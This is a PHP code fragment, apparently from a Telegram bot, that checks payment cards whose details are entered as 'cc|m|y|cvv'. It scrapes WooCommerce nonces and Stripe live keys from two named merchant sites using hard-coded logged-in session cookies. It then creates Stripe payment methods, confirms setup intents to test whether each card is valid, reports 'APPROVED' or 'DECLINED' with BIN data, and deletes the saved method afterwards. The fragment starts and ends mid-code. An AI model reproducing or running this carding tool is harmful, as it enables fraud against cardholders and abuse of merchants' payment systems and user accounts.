sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; __stripe_sid=c266cac5-c33e-46f6-84b4-84c82e9402350770fb',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Ce3130a0c99e501a87dca9f9fb17be96eaa3653a392f210f689c542dffcf2df01; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=c266cac5-c33e-46f6-84b4-84c82e9402350770fb; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.hollywoodexpendables.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}
	

elseif((strpos($message, "!ho") === 0)||(strpos($message, "/ho") === 0)||(strpos($message, ".ho") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
//$ano   = $i[2];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

                                                                      
$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
        if($verify != ""){
                $respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
                sendMessage($chat_id,$respuesta, $message_id);
                die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
	
}else{
        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ho cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ho cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ho cc|m|y|cvv\n";
	sendMessage($chat_id,$respuesta, $message_id);
	die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////EXTRAE EL NONCE////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; __stripe_sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731001401%7CCzBZx9kfPDJBYaMXtoBLjqHevXVnNFrVeSWmlEPn2Fk%7C75f66fe98f5174c97872c8da71c4ea525dcd112cd950bf764a961c85189cdb4e; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fea0a361bb5%3B+stripe-js-v3%2Fea0a361bb5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhoamemberservices.com&time_on_page=66639&client_attribution_metadata%5Bclient_session_id%5D=0e6aa10b-d993-4249-85d0-0edb6611a74b&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42&sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a&key='.$pk_live.'&_stripe_version=2024-06-20',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);

////HACE EL AUTH///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-05%2017%3A36%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fupdate-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; __stripe_sid=337ffb0d-efc1-4bb9-8fbd-ffd9f4b4671244dd9a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731001401%7CCzBZx9kfPDJBYaMXtoBLjqHevXVnNFrVeSWmlEPn2Fk%7C75f66fe98f5174c97872c8da71c4ea525dcd112cd950bf764a961c85189cdb4e; sbjs_session=pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://hoamemberservices.com',
    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
  ],
]);
/*
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$respo = $json['data']['error']['message'];
curl_close($curl);
echo $respo;
*/
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "Approved (1000)";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=13a09389-3b9c-4061-bf10-5b611f9c85d05d9c18; mailchimp.cart.previous_email=Sooppeed1983@dayrep.com; mailchimp.cart.current_email=sotiboy686@anypng.com; mailchimp_user_previous_email=sotiboy686%40anypng.com; mailchimp_user_email=sotiboy686%40anypng.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731007537%7Cs8KDHCHFTLDJAqteJuJfb3mxaMZtQWvSJFYWFeWzr7O%7C9902ee069172a0b6626f875fcdce5bc45e235f7fb156adc88021b63cd672e5d3; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";




$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=13a09389-3b9c-4061-bf10-5b611f9c85d05d9c18; mailchimp.cart.previous_email=Sooppeed1983@dayrep.com; mailchimp.cart.current_email=sotiboy686@anypng.com; mailchimp_user_previous_email=sotiboy686%40anypng.com; mailchimp_user_email=sotiboy686%40anypng.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731007537%7Cs8KDHCHFTLDJAqteJuJfb3mxaMZtQWvSJFYWFeWzr7O%7C9902ee069172a0b6626f875fcdce5bc45e235f7fb156adc88021b63cd672e5d3; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);



} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
